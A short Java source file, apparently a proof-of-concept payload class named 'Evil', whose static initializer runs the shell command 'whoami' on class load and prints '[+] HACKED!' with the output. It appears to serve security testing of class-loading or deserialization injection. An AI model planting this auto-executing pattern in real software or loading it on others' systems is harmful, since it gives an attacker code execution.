package test1;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Evil {
    static {
        try {
            Process process = Runtime.getRuntime().exec("whoami");
            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            System.out.println("[+] HACKED!");
            while ((line = br.readLine()) != null) {
                System.out.println(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
